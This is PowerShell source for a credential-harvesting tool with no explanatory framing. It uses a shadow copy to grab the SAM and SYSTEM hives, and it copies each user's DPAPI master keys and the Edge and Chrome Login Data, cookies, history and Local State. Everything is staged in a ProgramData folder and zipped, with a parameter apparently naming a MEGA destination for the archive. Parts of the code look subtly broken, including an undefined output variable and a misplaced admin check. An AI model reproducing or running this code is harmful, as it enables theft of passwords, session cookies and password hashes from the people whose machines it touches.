function Invoke-BrowserCopy {

param (
    [string]$objName,
    [string]$destMega
)

    function Test-isAdmin {
  
    $user = [Security.Principal.WindowsIdentity]::GetCurrent();
    (New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)  
}

    function Browser-Copy ($usersDir, $aBrowser) {
    
    if ($aBrowser -eq 'Edge') { $aBrowserPath = '\Microsoft\Edge\' } 
    elseif ($aBrowser -eq 'Chrome') { $aBrowserPath = '\Google\Chrome\' }
    else { echo "Unknown browser"; return }
    
    $aBrowserDestDir = ($browsersUserDestDir + $aBrowser + '\'); New-Item $aBrowserDestDir -ItemType Directory -ea 0
    $aBrowserUserDataDir = ($usersDir.FullName + '\' + '\AppData\Local\' + $aBrowserPath + '\User Data\')
    Copy-Item -Force ($aBrowserUserDataDir + '\Local State') -Destination $aBrowserDestDir

    foreach ($profile in (gci -Path $aBrowserUserDataDir -recurse | Where-Object {$_.BaseName -eq 'History'})) {
        $aBrowserProfileDestDir = ($aBrowserDestDir + $profile.Directory.Name + '\'); New-Item $aBrowserProfileDestDir -ItemType Directory -ea 0
        Copy-Item -Force ($profile.Directory.FullName + '\History') -Destination $aBrowserProfileDestDir
        Copy-Item -Force ($profile.Directory.FullName + '\Login Data') -Destination $aBrowserProfileDestDir
        $aBrowserCookPath = ($($volume.DeviceObject) + '\' + ($profile.Directory.FullName).Substring(2) + '\Network\Cookies')
        cmd /c copy $aBrowserCookPath $aBrowserProfileDestDir
    }
}

    $baseDir = 'C:\ProgramData\Waves\'; New-Item $baseDir -ItemType Directory -ea 0
    $appsDir = ($baseDir + 'Apps\'); New-Item $appsDir -ItemType Directory -ea 0
    $srcDir = 'C:\Users\'

    $currDateTime = (Get-Date -UFormat %d.%m.%y..%H.%M)
    $currDate = (Get-Date -UFormat %d.%m.%y)
    $currYear = (Get-Date -UFormat %Y)

    if ($objName -eq "") { $objName = $env:COMPUTERNAME }

    if ($destMega -eq "") { $destMega = "ZSUDocs/Browsers" }

    $browsersDestDir = ($baseDir + 'Browsers\'); New-Item $browsersDestDir -ItemType Directory -ea 0
        
    $VSsvc = (Get-Service -name VSS)
        
    if (Test-isAdmin) {
        if ($VSsvc.Status -ne "Running") { $VSsvc.Start(); $notrunning = 1 }  
        else { echo "You're not an administrator" }
    }

    $id = (Get-WmiObject -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
    $volume = (Get-WmiObject win32_shadowcopy -filter "ID='$id'")

    $samPath = ($($volume.DeviceObject) + '\Windows\System32\SAM')
    $sysPath = ($($volume.DeviceObject) + '\Windows\System32\SYSTEM')
    cmd /c copy $samPath ($browsersDestDir + 'SAM')
    cmd /c copy $sysPath ($browsersDestDir + 'SYS')

    foreach ($usersDir in (gci $srcdir)) {
        IF (($usersDir.Name -eq "Public") -OR ($usersDir.Name -eq "All Users") -OR ($usersDir.Name -eq "Default User") -OR ($usersDir.Name -eq "Default")) { continue }
        $browsersUserDestDir = ($browsersDestDir + $usersDir.Name + '\'); New-Item $browsersUserDestDir -ItemType Directory -ea 0
            
        Copy-Item -Force -Recurse ($usersDir.FullName + '\AppData\Roaming\Microsoft\protect\*') -Destination ($browsersUserDestDir)
        attrib.exe -h -s ($browsersDestDir + '\*') /s
        Browser-Copy $usersDir 'Edge'
        Browser-Copy $usersDir 'Chrome'
    }

    $volume.Delete()
    if($notrunning -eq 1) { $VSsvc.Stop() }

    Compress-Archive $browsersDestDir -Destination ($destDir + '\' + $objName + '_Browsers_' + $currDateTime + '.zip')
}